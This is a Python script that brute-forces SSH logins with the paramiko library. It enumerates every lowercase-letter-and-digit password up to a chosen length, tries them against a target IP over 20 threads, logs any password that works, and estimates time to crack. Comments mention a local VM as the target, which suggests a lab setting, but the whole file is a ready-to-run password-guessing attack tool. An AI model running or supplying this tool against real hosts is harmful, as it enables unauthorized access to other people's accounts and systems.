import paramiko
import itertools
import string
import logging
from concurrent.futures import ThreadPoolExecutor, as_completed
import time

# Set up logging
logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(message)s')

def attempt_ssh_login(ip, username, password):
    ssh_client = paramiko.SSHClient()
    ssh_client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    try:
        ssh_client.connect(ip, username=username, password=password, timeout=10) # Adjust timeout as needed
        logging.info(f"Success: {username}@{ip} with password: {password}")
        return True, password
    except paramiko.AuthenticationException:
        logging.info(f"Failed: {username}@{ip} with password: {password}")
        return False, password
    except Exception as e:
        logging.error(f"Error: {e}")
        return False, password
    finally:
        ssh_client.close()

def generate_passwords(max_length, chars):
    for length in range(1, max_length + 1):
        for password in itertools.product(chars, repeat=length):
            yield ''.join(password)

def brute_force_attack(ip, username, max_length):
    chars = string.ascii_lowercase + string.digits  # Character set to use
    passwords = generate_passwords(max_length, chars)
    successful_attempts = []
    start_time = time.time()

    with ThreadPoolExecutor(max_workers=20) as executor:
        futures = {executor.submit(attempt_ssh_login, ip, username, password): password for password in passwords}
        
        for future in as_completed(futures):
            success, password = future.result()
            if success:
                successful_attempts.append(password)
                # Uncomment below line to stop after first success
                # break

    end_time = time.time()
    elapsed_time = end_time - start_time
    logging.info(f"Elapsed time: {elapsed_time:.2f} seconds")

    if successful_attempts:
        logging.info(f"Passwords found: {successful_attempts}")
    else:
        logging.info("No passwords found.")

    return elapsed_time

def estimate_time_to_crack(ip, username, max_password_length):
    chars = string.ascii_lowercase + string.digits  # Character set to use
    total_combinations = sum(len(chars) ** length for length in range(1, max_password_length + 1))
    attempts_per_second = 500  # Adjust this based on your system's performance and network latency
    seconds_to_crack = total_combinations / attempts_per_second
    minutes_to_crack = seconds_to_crack / 60
    hours_to_crack = minutes_to_crack / 60

    logging.info(f"Estimated time to crack passwords up to length {max_password_length}:")
    logging.info(f"- Using {attempts_per_second} attempts per second: {hours_to_crack:.2f} hours")

    return hours_to_crack

target_ip = "192.168.43.128"  # Replace with your VM's IP address
username = "your_username"  # Replace with your macOS username
max_password_length = 4  # Maximum length of passwords to attempt

# Estimate time to crack passwords
estimate_time_to_crack(target_ip, username, max_password_length)

# Start brute force attack and measure elapsed time
brute_force_attack(target_ip, username, max_password_length)
